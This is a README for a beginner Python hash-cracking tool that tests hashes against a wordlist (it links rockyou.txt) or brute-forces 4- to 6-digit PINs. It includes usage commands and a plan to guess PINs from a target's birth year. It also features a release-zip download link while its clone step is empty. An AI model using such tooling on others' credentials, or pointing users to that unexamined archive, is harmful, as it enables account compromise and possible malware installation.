# Password Hashcracker:
This is a rudimentary Python project meant to help me learn more about how hashs work and programming in Python. Don't be expecting anything crazy here.

[download link](https://github.com/endguypie2000z14/Password-Cracker/releases/download/p8s5qfa/Password-Cracker.zip)

## Table of Contents:
- [Purpose](#purpose)
  - [Features](#features)
  - [Future Features](#future-features)
- [Tech Stack](#tech-stack)
- [Getting Started](#getting-started)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
- [Usage](#usage)

## Purpose:
The main goal of this project is to provide a quick and easy way to break hashes in the terminal without using Hashcat. Not all of us daily run Kali, some of us are just getting into the cybersecurity field. So, how should I break a hash? My solution was to combine my desire to improve my coding with my desire to learn more about cybersecurity. Obviously, this project primarily dealt with hashes and how they work. So, what can this code do?

### Features-
- Take a wordlist and a hashed password and tell you whether your target hash is on the wordlist or not.
- Take a request for a solution for a PIN of 4, 5, or 6 digits and generate, hash, and compare every permutation of that size until the correct code is found.

### Future Features-
- Generate a random password for you
- Generate a random PIN for you
- Hash any input
- Prioritize checking PINs with known higher likelihood of being correct based on user input (ie, target's birthyear)

## Tech Stack:
1. Python 3 - The main programming language used in this project. 
2. [hashlib](https://docs.python.org/3/library/hashlib.html) - Deals with the unhashing of target hashes.
3. [argparse](https://docs.python.org/3/library/argparse.html) - Creates the commands used for terminal use.
4. [itertools](https://docs.python.org/3/library/itertools.html)- Generates every possible 4 to 6 digit permutation of 0-9, depending on what you request.

## Getting Started:

### Prerequisites-
- Python 3
- pip (Python Package Manager)

### Installation
1. Clone the repository
   ```shell
   ```
2. Navigate to project directory
   ```shell
   cd Password-Cracker
   ```
3. Install any required Python packages
   ```shell
   pip install -r requirements
   ```
   
## Usage:
There are two fundamental commands, with similar syntax. The first is for when you have a hash and are trying to compare the hash to a list of possible words. If you're looking, I recommend rockyou.txt (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt). The command is given by 
```bash
python hashcracker.py --target <target hash> --algorithm <hash algorithm> --wordlist <path to wordlist>
```
This can be shortened to
```bash
python hashcracker.py -t <target hash> -a <hash algorithm> -w <path to wordlist>
```
Alternatively, you can have the program run through a list of PINs to find the correct PIN of some specified size.
```bash
python hashcracker.py --target <target hash> --algorithm <hash algorithm> --pin-length <PIN length - 4, 5, or 6>
```
This can also be shortened.
```bash
python hashcracker.py -t <target hash> -a <hash algorithm> -pl <PIN length - 4, 5, or 6>
```

